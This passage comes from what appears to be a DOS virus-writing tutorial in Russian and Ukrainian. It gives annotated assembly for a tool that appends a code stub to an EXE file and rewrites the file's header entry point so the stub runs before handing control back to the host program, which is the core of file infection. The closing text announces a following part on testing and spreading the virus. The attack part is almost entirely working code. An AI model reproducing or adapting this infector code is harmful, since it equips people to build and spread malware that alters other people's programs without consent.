        push    cs
        push    cs
        pop     es
        pop     ds
        mov     bx,ax
        mov     si,offset buffer
        call    RdHdr
        call    processHeader
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202h
        int     21h             ; Переместили указатель на конец файла
        mov     ah,40h
        mov     dx,offset myProc
        mov     cx,myProcLen
        int     21h             ; Записали myProc в конец файла
        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        int     21h             ; Переместили указатель на начало файла

        mov     dx,si
        mov     cx,1ah
        mov     ah,40h
        int     21h             ; Записали новый заголовок

        mov     ah,3eh          ; Закрыли файл
        int     21h
        mov     ax,4c00h
        int     21h

exit:
        push    cs
        pop     ds
        mov     ah,9
        int     21h
        mov     ah,4ch
        int     21h

processHeader   proc    near
        ; Обработка заголовка.

        mov     ax,4202h
        xor     dx,dx
        xor     cx,cx
        int     21h
        mov     lenHigh,dx
        mov     lenLow,ax              ; dx:ax - длина файла

        mov     cx,512
        div     cx                     ; dx:ax делим на 512
        or      dx,dx
        jz      do_not_inc             ; перехiд, якщо остачa вiд дiлення = 0
        inc     ax
do_not_inc:
        cmp     ax,[si].PageCnt
        jne     close_and_exit
        cmp     dx,[si].PartPag
        jne     close_and_exit          ; переходи, якщо файл може мiстити
                                        ; оверлей.

        jmp     short fileOK            ; Перехiд, якщо ТОЧНО нема оверле∙в
close_and_exit:
        mov     ah,3eh
        int     21h                     ; Закрили.
        mov     dx,offset string2
        pop     ax
        mov     ax,offset exit
        push    ax
        retn                            ; Bye, sir!


fileOK:
        mov     ax,[si].ReloCS
        mov     KeepCS,ax
        mov     ax,[si].ReloSS
        mov     KeepSS,ax
        mov     ax,[si].ExeIP
        mov     KeepIP,ax
        mov     ax,[si].ExeSP
        mov     KeepSP,ax

        mov     ax,lenLow
        mov     dx,lenHigh
        mov     cx,16
        div     cx
        sub     ax,[si].HdrSize
        mov     [si].ReloCS,ax
        mov     [si].ExeIP,dx
        mov     [si].ReloSS,ax
        add     dx,myProcLen+1000h
        mov     [si].ExeSP,dx

        mov     ax,lenLow
        mov     dx,lenHigh
        add     ax,myProcLen
        adc     dx,0

        mov     cx,512
        div     cx
        or      dx,dx
        jz      do_not_inc2
        inc     ax
do_not_inc2:
        mov     [si].PageCnt,ax
        mov     [si].PartPag,dx
        retn
processHeader   endp


hdrLen          dw   ?
lenHigh         dw   ?
lenLow          dw   ?
string          db       "Change Compressed File - 2, 'Copyright (c) by "
                db       "MrStrange. Produced in Kiev.",13,10,10,'$'
string1         db       "В коммандной строке неверно указан файл",13,10,'$'
string2         db       "Длина в заголовке не совпадает с длиной файла"
                db       13,10,'$'

;

buffer          db      20h dup (?)

myProc  proc    near
        call    $+3
        pop     di
        sub     di,3

        push    cs
        pop     ds
        mov     dx,offset dummyString - offset myProc
        add     dx,di           ; Сейчас в dx - смещение dummyString
        mov     ah,9
        int     21h             ; Ничегошеньки мы не выводим;
                                ; так, прикалываемся...


        push    es
        pop     ds

        mov     bx,ds
        add     bx,10h
db      @mov_cx
KeepSS  dw      ?
        add     cx,bx
        cli
        mov     ss,cx
db      @mov_sp
KeepSP  dw      ?
        sti
        pushf
db      @mov_cx
KeepCS  dw      ?
        add     cx,bx
        push    cx
db      @mov_ax
KeepIP  dw      ?
        push    ax
        iret            ; Вернулись в программу
myProc  endp
dummyString     db      '$'
myProcLen       equ     offset theEnd - offset myProc
theEnd  label   byte
_code   ends
end     start

════════════════════════════════════════════════════════════════════════════

      Эти два метода можно использовать вместе (естественно,
 сначала первый).

        Hа этом с практикой покончено полностью, осталась только теория
о бета-тестировании и распространении вируса, которую Вы прочитаете,
открыв Часть E.